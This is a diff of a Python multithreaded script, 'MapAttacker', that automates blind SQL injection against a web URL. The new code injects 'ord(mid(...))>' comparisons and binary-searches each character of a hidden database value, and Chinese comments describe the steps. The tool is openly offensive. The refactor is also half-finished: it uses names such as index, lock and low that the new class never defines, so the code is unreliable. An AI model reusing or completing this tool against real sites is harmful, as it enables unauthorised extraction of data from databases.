@@ -1,6 +1,16 @@
 import requests
 import threading
 import time
+
+
+# MapAttacker -> 
+#
+#
+#
+#
+#
+#
+
 class MapAttackerResult:
     index=0
     result=''
@@ -21,36 +31,16 @@ class Runner(threading.Thread):
         def run(self):
             while not self.parent.getResult():
                 time.sleep(0.1)
-
-class MapAttacker:
-    lock=threading.Lock()
-    url=''
-    length=32
-    nowLength=0
-    nowIndex=0
-    nowCompleteCount=0
-    ranges='abcdefghijklmnopqrstuvwxyz'
-    nowResult=''
-    resultList=[]#List<MapAttackerResult>
-    threads=[]
-    maxThread=4
-    #攻击当前的位数
-    def __init__(self,url,length,ranges):
-        self.url=url 
-        self.length=length
-        self.ranges=ranges
-    def StartAttack(self):
-        self.ResetThread(True)
-        for i in range(self.maxThread):
-            Runner(str(i),self).start()
-    def getSingleResult(self,index):
-        tarUrl=self.url.format(self.nowLength,self.nowResult+self.ranges[index:index+1])
+class MapAttackerSingleChr:
+    #获取指定位置的值
+    def getSingleResult(self,nowPos):
+        tarUrl=self.parent.url.format(f'ord(mid({self.toFind},{nowPos},1))>{(self.low+self.high)/2}')
         self.lock.release()
         try:
             tmpResponse=requests.get(tarUrl,timeout=3).text
         except:
             self.lock.acquire()
-            return self.getSingleResult(index)
+            return self.getSingleResult(nowPos)
         
         self.lock.acquire()
         self.nowCompleteCount+=1
@@ -58,6 +48,23 @@ class MapAttacker:
             self.ComsumeNowResult()
         print(f"{index}:{tarUrl}:{str(len(tmpResponse))}")
         self.resultList.append(MapAttackerResult(index,tmpResponse)) 
+    def __init__(self, parent,toTryPos):
+        self.toTryPos=toTryPos#获取某位
+        self.parent=parent
+class MapAttacker:
+    lock=threading.Lock()
+    
+    #攻击当前的位数
+    def __init__(self,url,length,low,high):
+        self.url=url 
+        self.length=length
+        self.low=low
+        self.high=high
+    def StartAttack(self):
+        self.ResetThread(True)
+        for i in range(self.maxThread):
+            Runner(str(i),self).start()
+    
     #获取指定序号的返回结果并存入到resultList[]
     def getResult(self):
         finished=False
